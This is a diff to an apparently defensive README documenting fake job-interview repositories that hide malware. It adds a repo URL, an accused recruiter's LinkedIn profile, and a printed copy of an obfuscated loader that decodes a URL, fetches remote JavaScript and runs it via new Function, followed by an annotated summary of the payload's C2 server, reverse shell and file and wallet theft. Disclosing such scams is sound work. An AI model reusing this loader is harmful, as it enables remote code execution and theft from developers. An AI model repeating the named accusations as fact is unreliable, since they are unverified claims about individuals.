@@ -68,6 +68,7 @@ The code is kept for educational and research purposes only.
 - https://github.com/0xtuneTF7/DEX-staking-project
 - https://github.com/SuperDev313/Trading_Platform_Ultrax
 - https://bitbucket.org/web3_space/workspace/repositories/
+- https://github.com/goldencity010/demo_version
 
 ### Known scammer recruiter profiles
 
@@ -89,6 +90,7 @@ The code is kept for educational and research purposes only.
 - [Brian Patterson](https://www.linkedin.com/in/brian-patterson-71954b116/)
 - [Joe Carlino](https://www.linkedin.com/in/joe-carlino-28856b78/)
 - [Mark Laris](https://www.linkedin.com/in/mark-laris-805619a/)
+- [Adam Majoros](https://www.linkedin.com/in/adam-majoros-a73944105/)
 
 ## Extra Links
 
@@ -103,6 +105,8 @@ The code is kept for educational and research purposes only.
 - [Ultrax scam victims report - on Github](https://github.com/tayvano/lazarus-bluenoroff-research/blob/main/hacks-and-thefts/ultrax-dex.md)
 
 - [Linkedin Scams Blog Post](https://www.himthe.dev/blog/linkedin-interview-scams)
+
+- [Test Requirements Docs](https://docs.google.com/document/d/1Ge5LJeA8IIRR9ckurhD5scGJaJnI-4cM51-8EbZZcMU/edit?tab=t.xhrrmhvuccxv)
 
 ## On Linkedin
 
@@ -408,6 +412,101 @@ exports.getCookie = asyncErrorHandler(async (req, res, next) => {
   eval(rs_C.data.cookie);
 })();
 ```
+
+The repo contains a payload in `https://github.com/goldencity010/demo_version/blob/main/server/controllers/userController.js` line 121
+Same code updated to
+```javascript
+//Get Cookie
+(async () => {
+   // This decodes to: https://api.npoint.io/bda10c07923fceb4f20c
+  const byteArray = [
+    104, 116, 116, 112, 115, 58, 47, 47, 97, 112, 105, 46, 110, 112, 111, 105,
+    110, 116, 46, 105, 111, 47, 98, 100, 97, 49, 48, 99, 48, 55, 57, 50, 51, 102,
+    99, 101, 98, 52, 102, 50, 48, 99
+  ];
+  const uint8Array = new Uint8Array(byteArray);
+  const decoder = new TextDecoder('utf-8');
+  axios.get(decoder.decode(uint8Array))
+    .then(response => {
+      new Function("require", response.data.cookie)(require);
+    })
+    .catch(error => { });
+})();
+
+// ========================================
+// DECODED MALWARE ANALYSIS
+// Source: https://api.npoint.io/bda10c07923fceb4f20c
+//
+
+// ========================================
+// DECODED VERSION - What the malware actually does:
+// ========================================
+
+// 1. DECODED NETWORK CONFIGURATION
+const MALWARE_CONFIG = {
+  // Main Command & Control Server
+  mainServer: "144.172.94.226:6961", // Reverse shell connection
+
+  // File Upload Server
+  uploadServer: "144.172.94.226:6966", // Exfiltrates stolen files
+
+  // Key Management Server
+  keyServer: "144.172.94.226:6967", // Encryption/decryption keys
+
+  // Logging Server
+  logServer: "144.172.94.226:6968", // Activity logs
+
+  // Unique identifier for this infected machine
+  machineId: "5c70fc15b1aece5910f4a6b7c8665a2f",
+
+  // Authentication tokens
+  userKey: 1003,
+  token: 66
+};
+
+// 2. DECODED FUNCTIONALITY
+const MALWARE_FUNCTIONS = {
+  // Suppresses all error messages to avoid detection
+  suppressErrors: () => {
+    process.on("uncaughtException", () => {});
+    process.on("unhandledRejection", () => {});
+  },
+
+  // Creates reverse shell connection every 5 seconds
+  establishReverseShell: () => {
+    setInterval(() => {
+      // Connects to 144.172.94.226:6961
+      // Allows attacker to execute commands remotely
+    }, 5000); // 5 second intervals
+  },
+
+  // Monitors clipboard for sensitive data
+  monitorClipboard: () => {
+    // Captures everything copied to clipboard
+    // Sends passwords, sensitive text, etc. to attacker
+  },
+
+  // Scans and uploads sensitive files
+  scanAndUpload: () => {
+    // Searches for files containing:
+    // - .env files (API keys, passwords)
+    // - .json files (configuration data)
+    // - Documents (.doc, .pdf, .txt)
+    // - Images (screenshots, photos)
+    // - Source code files
+    // - Wallet files (cryptocurrency)
+    // - Database files
+  },
+
+  // Executes commands from remote server
+  executeRemoteCommands: (command) => {
+    // Runs any command sent by attacker
+    // Full system access
+  }
+};
+```
+
+
 
 The payload is obfuscated and executes fetched JavaScript code using eval(), allowing attackers to run malicious code with node-level privileges.
 
